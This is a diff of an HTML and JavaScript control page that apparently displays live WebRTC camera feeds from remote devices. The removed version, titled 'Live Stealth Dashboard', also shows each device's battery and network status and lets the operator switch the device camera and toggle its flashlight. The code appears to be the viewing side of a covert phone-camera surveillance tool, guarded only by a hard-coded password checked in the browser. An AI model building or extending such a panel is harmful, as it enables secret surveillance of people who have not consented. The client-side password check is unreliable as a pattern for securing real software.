@@ -1,57 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Monitor</title>
+    <title>Monitor</title>
     <style>
-        body{background:#111;color:white;font-family:sans-serif;text-align:center;margin:0;}
-        #box{display:flex;flex-wrap:wrap;justify-content:center;padding:20px;gap:20px;}
-        .card{background:#222;padding:15px;border-radius:12px;border:1px solid #444;width:350px;}
-        video{width:100%;background:#000;border-radius:8px;}
-        .info{font-size:12px;margin:10px 0;display:flex;justify-content:space-around;color:#aaa;}
-        button{padding:10px;margin:5px;cursor:pointer;border:none;border-radius:5px;background:#333;color:white;font-weight:bold;flex:1;}
-        .btn-torch-on { background: #28a745 !important; }
-        .btn-torch-off { background: #dc3545 !important; }
-        #login{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;z-index:99;}
+        body { background: #111; color: #fff; text-align: center; font-family: sans-serif; margin: 0; }
+        #login { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 100; }
+        .login-box { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #f85606; }
+        input { padding: 12px; margin-bottom: 10px; border-radius: 5px; border: none; width: 220px; outline: none; }
+        video { width: 90%; max-width: 750px; background: #000; border: 2px solid #333; margin-top: 20px; border-radius: 12px; }
+        button { padding: 15px 30px; background: #f85606; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        h2 { color: #f85606; }
     </style>
 </head>
 <body>
-    <div id="login"><div><h2>🔒 Admin Panel</h2><input type="password" id="ps" placeholder="rony25" style="padding:10px;"><br><br><button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Login</button></div></div>
-    <h2>🛰️ Live Stealth Dashboard</h2>
-    <div id="box"></div>
+    <div id="login">
+        <div class="login-box">
+            <h2>🔒 Security Access</h2>
+            <input type="password" id="ps" placeholder="Enter Password" autocomplete="new-password"><br>
+            <button onclick="checkLogin()">Access Monitor</button>
+        </div>
+    </div>
+
+    <div id="monitor-ui" style="display: none;">
+        <h2>🛰️ Live Monitor Dashboard</h2>
+        <video id="remoteVideo" autoplay playsinline controls></video><br>
+        <button onclick="socket.emit('switch')">🔄 Switch Front/Back Camera</button>
+    </div>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        let socket, peers = {};
-        function init() {
-            socket = io();
-            socket.on("offer", async (d) => {
-                if(peers[d.id]) return;
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                peers[d.id] = pc;
-                const card = document.createElement("div"); card.className="card"; card.id="c-"+d.id;
-                card.innerHTML = `<video id="v-${d.id}" autoplay playsinline controls></video>
-                    <div class="info" id="i-${d.id}">🔋 --% | 🌐 --</div>
-                    <div style="display:flex;">
-                        <button onclick="socket.emit('switch','${d.id}')">🔄 Switch</button>
-                        <button id="t-${d.id}" class="btn-torch-off" onclick="socket.emit('torch','${d.id}')">💡 Light: OFF</button>
-                    </div>`;
-                document.getElementById("box").appendChild(card);
-                pc.ontrack = e => document.getElementById("v-"+d.id).srcObject = e.streams;
-                await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
-                const a = await pc.createAnswer(); await pc.setLocalDescription(a);
-                socket.emit("answer", { answer: a, id: d.id });
-                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: d.id });
-            });
+        let socket;
+        function checkLogin() {
+            if (document.getElementById("ps").value === "rony25") {
+                document.getElementById("login").style.display = "none";
+                document.getElementById("monitor-ui").style.display = "block";
+                initMonitor();
+            } else { alert("Wrong Password!"); }
+        }
 
-            socket.on("status-update", d => {
-                const info = document.getElementById("i-"+d.id);
-                if(info) info.innerText = `🔋 ${d.battery || '--'}% | 🌐 ${d.network || '--'}`;
-                const btn = document.getElementById("t-"+d.id);
-                if(btn && d.torch !== undefined) {
-                    btn.innerText = d.torch ? "💡 Light: ON" : "💡 Light: OFF";
-                    btn.className = d.torch ? "btn-torch-on" : "btn-torch-off";
-                }
+        function initMonitor() {
+            socket = io();
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            socket.on("offer", async (offer) => {
+                await pc.setRemoteDescription(new RTCSessionDescription(offer));
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                socket.emit("answer", answer);
             });
-            socket.on("user-left", id => { document.getElementById("c-"+id)?.remove(); delete peers[id]; });
+            socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
+            pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
+            pc.ontrack = e => { document.getElementById("remoteVideo").srcObject = e.streams[0]; };
         }
     </script>
 </body>
